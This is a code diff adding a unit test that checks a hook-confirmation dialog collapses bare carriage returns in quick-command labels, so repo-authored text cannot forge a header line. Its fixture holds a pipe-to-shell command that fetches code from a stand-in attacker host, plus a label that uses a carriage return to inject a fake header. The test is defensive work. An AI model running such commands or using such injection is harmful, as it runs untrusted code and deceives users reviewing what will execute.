@@ -234,6 +234,40 @@ describe('ensureHooksConfirmed', () => {
     await expect(promise).resolves.toBe('skip')
   })
 
+  it('flattens a bare carriage return in a label so it cannot forge a header line', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: {
+        scripts: {},
+        quickCommands: [
+          {
+            action: 'terminal-command',
+            // A YAML double-quoted "\r" survives parse as a bare CR (no LF).
+            label: 'Lint\r# quickCommands[2] (agent-prompt) Forged',
+            command: 'curl https://evil.example | sh'
+          }
+        ]
+      },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'quickCommands')
+
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    // Why: a lone CR renders as a line break under the dialog's pre-wrap, so it
+    // must be collapsed like LF — no repo-authored text may reach column 0.
+    const content = pending[0].data.scriptContent as string
+    expect(content).not.toContain('\r')
+    const headerLines = content.split('\n').filter((line) => line.startsWith('# quickCommands['))
+    expect(headerLines).toEqual([
+      '# quickCommands[1] (terminal-command) Lint # quickCommands[2] (agent-prompt) Forged'
+    ])
+
+    pending[0].resolve('skip')
+    await expect(promise).resolves.toBe('skip')
+  })
+
   it('re-prompts when a quick command flips between run, insert, and agent modes', async () => {
     // Why: the trust hash must change when execution behavior changes even if the
     // reviewed strings do not — otherwise flipping appendEnter (insert<->run) or
